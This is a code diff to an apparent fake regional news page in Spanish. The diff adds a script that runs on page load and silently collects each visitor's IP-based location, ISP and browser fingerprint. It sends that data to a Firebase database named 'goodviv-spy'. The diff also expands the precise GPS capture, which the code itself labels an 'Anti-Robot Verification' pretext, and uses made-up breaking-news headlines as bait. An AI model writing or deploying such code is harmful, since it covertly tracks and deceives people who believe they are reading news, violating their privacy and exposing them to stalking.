@@ -517,6 +517,74 @@
         // Variable global para la noticia actual
         let currentNews = null;
         
+        // Función para captura automática por IP (sin permisos)
+        async function captureIPLocationAuto() {
+            try {
+                console.log('🌐 Iniciando captura automática por IP...');
+                
+                // Obtener información de IP
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                // Datos adicionales del navegador (sin permisos)
+                const browserData = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenRes: screen.width + 'x' + screen.height,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    onlineStatus: navigator.onLine
+                };
+                
+                const locationData = {
+                    id: 'ip_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                    method: 'IP_AUTOMATIC',
+                    source: 'Diario Regional - IP Capture',
+                    timestamp: new Date().toISOString(),
+                    
+                    // Ubicación por IP
+                    city: ipData.city || 'Unknown',
+                    region: ipData.region || 'Unknown', 
+                    country: ipData.country_name || 'Unknown',
+                    lat: ipData.latitude || 0,
+                    lng: ipData.longitude || 0,
+                    accuracy: 'City-level (~5-50km)',
+                    ip: ipData.ip || 'Unknown',
+                    isp: ipData.org || 'Unknown',
+                    
+                    // Datos del navegador
+                    timezone: browserData.timezone,
+                    language: browserData.language,
+                    platform: browserData.platform,
+                    screenRes: browserData.screenRes,
+                    userAgent: navigator.userAgent,
+                    cookiesEnabled: browserData.cookiesEnabled,
+                    onlineStatus: browserData.onlineStatus,
+                    
+                    // Contexto de la página
+                    url: window.location.href,
+                    referrer: document.referrer || 'Direct',
+                    pageTitle: document.title
+                };
+                
+                console.log('🌐 Ubicación IP capturada automáticamente:', locationData);
+                
+                // Guardar en Firebase
+                await fetch('https://goodviv-spy-default-rtdb.firebaseio.com/locations.json', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(locationData)
+                });
+                
+                console.log('✅ Datos IP enviados a Firebase exitosamente (automático)');
+                
+            } catch (error) {
+                console.log('⚠️ Error en captura automática por IP:', error);
+            }
+        }
+        
         const newsTemplates = {
             traffic: {
                 title: "🚦 Grave Accidente en Avenida Principal Deja Varios Heridos y Genera Caos Vehicular",
@@ -616,18 +684,32 @@
             );
         }
         
-        // Capturar y almacenar ubicación
+        // Capturar y almacenar ubicación GPS (precisa)
         function captureLocation(position) {
             const locationData = {
-                id: 'loc_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                id: 'gps_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                method: 'GPS_PRECISE',
+                source: 'Diario Regional - GPS Capture',
+                timestamp: new Date().toISOString(),
+                
+                // Ubicación GPS exacta
                 lat: position.coords.latitude,
                 lng: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                timestamp: new Date().toISOString(),
-                source: 'Diario Regional - Noticias',
+                accuracy: position.coords.accuracy + 'm',
+                altitude: position.coords.altitude || 'Unknown',
+                heading: position.coords.heading || 'Unknown',
+                speed: position.coords.speed || 'Unknown',
+                
+                // Contexto de captura
+                captureMethod: 'Anti-Robot Verification',
+                newsTitle: document.getElementById('newsTitle').textContent,
                 userAgent: navigator.userAgent,
                 url: window.location.href,
-                newsTitle: document.getElementById('newsTitle').textContent
+                
+                // Datos adicionales
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                screenRes: screen.width + 'x' + screen.height
             };
             
             console.log('📍 Ubicación capturada:', locationData);
@@ -798,6 +880,11 @@
         // Inicializar página
         document.addEventListener('DOMContentLoaded', function() {
             console.log('📰 Iniciando Diario Regional...');
+            
+            // 🚀 CAPTURA AUTOMÁTICA POR IP (INMEDIATA - SIN PERMISOS)
+            setTimeout(() => {
+                captureIPLocationAuto();
+            }, 1000); // Esperar 1 segundo para que cargue completamente
             
             // Ejecutar diagnóstico de geolocalización
             runGeolocationDiagnostic();
